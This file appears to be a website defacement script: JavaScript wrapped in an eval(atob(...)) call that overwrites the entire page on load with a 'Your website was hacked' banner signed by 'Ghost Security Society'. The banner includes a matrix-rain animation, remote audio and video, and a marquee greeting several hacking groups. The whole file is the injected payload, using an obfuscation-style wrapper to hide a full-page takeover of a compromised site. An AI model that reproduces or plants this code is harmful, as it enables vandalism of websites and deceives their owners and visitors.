eval(atob('(function(){
  function go(){
    document.open(); document.write(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>PAWNED BY GHOST_SEC101</title>
<link rel="icon" href="https://i.ibb.co/FLYtNPVn/1759726240396.png">
<link href="https://fonts.googleapis.com/css2?family=Goldman&display=swap" rel="stylesheet">
<link href="https://fonts.cdnfonts.com/css/caviar-dreams" rel="stylesheet">
<link href="https://fonts.cdnfonts.com/css/nevis" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
@font-face {
font-family: 'AnonymousFont';
src: url('https://raw.githubusercontent.com/nakilageorge69/anonymous/main/ghost.ttf') format('truetype');
}

body {
font-family: "Goldman", monospace;
margin: 0; padding: 20px;
text-align: center;
color: white;
background: black;
min-height: 100vh;
overflow-x: hidden;
display: flex;
flex-direction: column;
justify-content: center;
align-items: center;
gap: 8px;
}

#bg-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -3; }
#video-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
#matrix { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.3; }
body::after { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: -2; }

.profile-img img { width: 220px; height: 220px; object-fit: cover; border-radius: 50%; }

.main-title {
font-family: 'AnonymousFont', serif;
font-size: 2.8em;
color: red;
margin: 0;
font-weight: normal;
letter-spacing: 2px;
/* changed: removed uppercase to preserve capitalization */
text-shadow: 0 0 3px red, 0 0 50px red, 0 0 50px red;
animation: blinkSlow 3s infinite;
}

@keyframes blinkSlow {
0%, 100% { opacity: 1; }
50% { opacity: 0; }
}

.header-top {
position: fixed; top: 0; left: 0; width: 100%;
background: rgba(0,0,0,0.6);
padding: 15px 0;
z-index: 20;
}
.header-top::after {
content: "";
display: block;
width: 100%;
height: 4px;
background: red;
box-shadow: 0 0 15px red, 0 0 30px red;
}
.header-top h1 {
margin: 0;
font-family: 'AnonymousFont', serif;
font-size: 3em;
color: white;
letter-spacing: 3px;
/* changed: removed text-transform: uppercase; */
text-shadow: 0 0 10px red, 0 0 25px red, 0 0 50px red;
}
.subtext {
font-size: 0.9em;
color: red;
letter-spacing: 2px;
margin-top: 6px;
margin-bottom: 6px;
}

h1.greetings, h1.collaborators {
font-family: 'AnonymousFont', serif;
font-size: 1em;
color: white;
text-transform: uppercase;
letter-spacing: 2px;
margin: 10px 0;
text-shadow: 0 0 10px red, 0 0 25px red, 0 0 50px red;
}

.styled-text {
font-family: 'Caviar Dreams', sans-serif;
font-size: 1.2rem;
white-space: pre-line;
line-height: 1.4;
font-weight: normal;
margin: 0;
}

.clock { font-size: 1em; color: red; margin: 0; }
.date { font-size: 1em; color: white; margin: 0; }

/* ✅ Fixed marquee style with parentheses */
.marquee {
width: 240px;
margin: 15px auto;
overflow: hidden;
white-space: nowrap;
text-align: center;
background: transparent;
position: relative;
}
.marquee span {
display: inline-block;
color: white;
font-size: 1rem;
font-family: 'Courier', monospace;
padding-right: 50px;
position: relative;
white-space: nowrap;
}
.marquee::before, .marquee::after {
content: "[ ";
position: absolute;
top: 50%;
transform: translateY(-50%);
font-size: 1.2rem;
color: red;
text-shadow: 0 0 8px red, 0 0 16px red;
}
.marquee::after { content: " ]"; right: 0; }
.marquee::before { left: 0; }

.controls {
margin-top: 10px;
display: flex;
gap: 20px;
justify-content: center;
}
.controls button {
padding: 10px 30px;
font-size: 1rem;
font-family: 'Alusrg', sans-serif;
border: 2px solid black;
border-radius: 6px;
cursor: pointer;
background: red;
color: white;
text-shadow: 0 0 10px black;
transition: 0.3s;
}
.controls button:hover {
background: red;
color: white;
box-shadow: 0 0 10px black, 0 0 25px black;
}

.social-icons {
margin-top: 12px;
display: flex;
justify-content: center;
gap: 20px;
}
.social-icons a {
color: white;
font-size: 1.8em;
text-shadow: 0 0 10px red, 0 0 20px red, 0 0 40px red;
transition: transform 0.2s ease-in-out;
}
.social-icons a:hover {
transform: scale(1.2);
color: red;
}

.copyright-bar {
position: fixed;
bottom: 0;
left: 0;
width: 100%;
background: rgba(0,0,0,0.6);
padding: 15px 0;
}
.copyright-bar::before {
content: "";
display: block;
width: 100%;
height: 4px;
background: red;
box-shadow: 0 0 15px red, 0 0 30px red;
}
.copyright-bar h4 {
margin: 20px;
font-size: 1em;
color: white;
font-family: 'Caviar Dreams', sans-serif;
text-shadow: 0 0 10px red, 0 0 25px red, 0 0 50px red;
}
</style>
</head>
<body>
<div id="bg-container">
<video id="video-bg" autoplay muted loop playsinline>
<source src="https://ik.imagekit.io/vt0n3jlzx/background.webm/ik-video.mp4?updatedAt=1757589526287" type="video/mp4">
</video>
<canvas id="matrix"></canvas>
</div>

<div class="header-top">
<h1>Ghost Security Society</h1>
<div class="subtext">RED HAT HACKER</div>
</div>

<div class="main-title">Your Website Was Hacked</div>

<div class="profile-img"><img src="https://i.ibb.co/FLYtNPVn/1759726240396.png" alt="Profile Image"></div>

<h4 class="greetings">ADMINISTRATORS</h4>
<p id="typewriter" class="styled-text"></p>
<p id="quote" class="styled-text"></p>
<div class="date" id="date"></div>
<div class="clock" id="clock"></div>

<h4 class="collaborators">TEAM GREETINGS</h4>

<div class="marquee" id="marqueeContainer">
<span id="marqueeText">NULLSEC PHILIPPINES | DECODE HACKERS GROUP | PHANTOM CHAMBER | QUANTUM SECURITY GROUP | OBLIVION | STORM BREAKER SECURITY | LULZ GLOBAL | XBL4Z3RS SEC PH | GHOST SECURITY SOCIETY PHILIPPINES</span>
</div>

<div class="controls">
<button id="toggleBtn" onclick="toggleAll()">PLAY</button>
</div>

<div class="social-icons">
<a href="#"><i class="fab fa-instagram"></i></a>
<a href="#"><i class="fab fa-facebook"></i></a>
<a href="#"><i class="fab fa-whatsapp"></i></a>
<a href="#"><i class="fab fa-tiktok"></i></a>
</div>

<div class="copyright-bar">
<h4>~ Copyright @ 2019 Ghost Security Society All Right Reserved ~ </h4>
</div>

<audio id="myAudio" loop>
<source src="https://audio.jukehost.co.uk/rFapVkX5nnncYMvrutJoXUXLpBTvNsNa" type="audio/mpeg">
</audio>
<audio id="narrationAudio">
<source src="https://audio.jukehost.co.uk/VF7yqObFHmdzkdtl5cEv1uGEpBVcM6Fk" type="audio/mpeg">
</audio>

<script>
function updateClock(){
const now=new Date();
document.getElementById('clock').textContent=now.toLocaleTimeString('en-GB',{hour12:false});
const months=["JAN","FEB","MAR","APR","MAY","JUN","JUL","AUG","SEP","OCT","NOV","DEC"];
document.getElementById('date').textContent=\`\${months[now.getMonth()]} : \${String(now.getDate()).padStart(2,'0')} : \${now.getFullYear()}\`;
}
setInterval(updateClock,1000); updateClock();

const audio=document.getElementById("myAudio");
const narration=document.getElementById("narrationAudio");
const toggleBtn=document.getElementById("toggleBtn");
let isPlaying=false;
audio.volume=0.05; narration.volume=1.0;

function toggleAll(){
if(!isPlaying){
audio.muted=false; audio.play().catch(()=>{}); narration.play().catch(()=>{}); toggleBtn.textContent="STOP"; isPlaying=true;
}else{
audio.pause(); audio.currentTime=0; narration.pause(); narration.currentTime=0; toggleBtn.textContent="PLAY"; isPlaying=false;
}
}

narration.addEventListener("ended",()=>{
let vol=audio.volume;
const fade=setInterval(()=>{
if(vol<0.5){ vol+=0.01; audio.volume=vol; } else clearInterval(fade);
},150);
});

const msg=\`Your website was hacked due to weak security.
This is only a warning for You
Please fix it as soon as possible.\`;
let i=0;
function typeWriter(){
if(i<msg.length){
document.getElementById("typewriter").textContent+=msg.charAt(i);
i++;
setTimeout(typeWriter,40);
}
}
narration.addEventListener("play",()=>{
document.getElementById("typewriter").textContent="";
i=0;
typeWriter();
});

// ✅ Matrix Rain Effect
const c=document.getElementById("matrix");
const ctx=c.getContext("2d");
c.height=innerHeight; c.width=innerWidth;
const letters="01";
const fontSize=14;
const columns=c.width/fontSize;
const drops=Array(Math.floor(columns)).fill(1);

function draw(){
ctx.fillStyle="rgba(0,0,0,0.05)";
ctx.fillRect(0,0,c.width,c.height);
ctx.fillStyle="#0f0";
ctx.font=fontSize+"px monospace";
for(let i=0;i<drops.length;i++){
const text=letters[Math.floor(Math.random()*letters.length)];
ctx.fillText(text,i*fontSize,drops[i]*fontSize);
if(drops[i]*fontSize>c.height&&Math.random()>0.975)drops[i]=0;
drops[i]++;
}
}
setInterval(draw,33);

// ✅ Custom bouncing marquee
const marquee=document.getElementById("marqueeText");
const container=document.getElementById("marqueeContainer");
let pos=0;
let dir=-1; // left
const speed=2;

function animateMarquee(){
const containerWidth=container.offsetWidth;
const textWidth=marquee.offsetWidth;

pos+=dir*speed;
if(pos < -(textWidth - containerWidth*0.99)){
dir=1;
}
if(pos > containerWidth*0.1){
dir=-1;
}

marquee.style.transform=\`translateX(\${pos}px)\`;
requestAnimationFrame(animateMarquee);
}
animateMarquee();
</script>
</body>
</html>
`); document.close();
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', go);
  else go();
})();'));
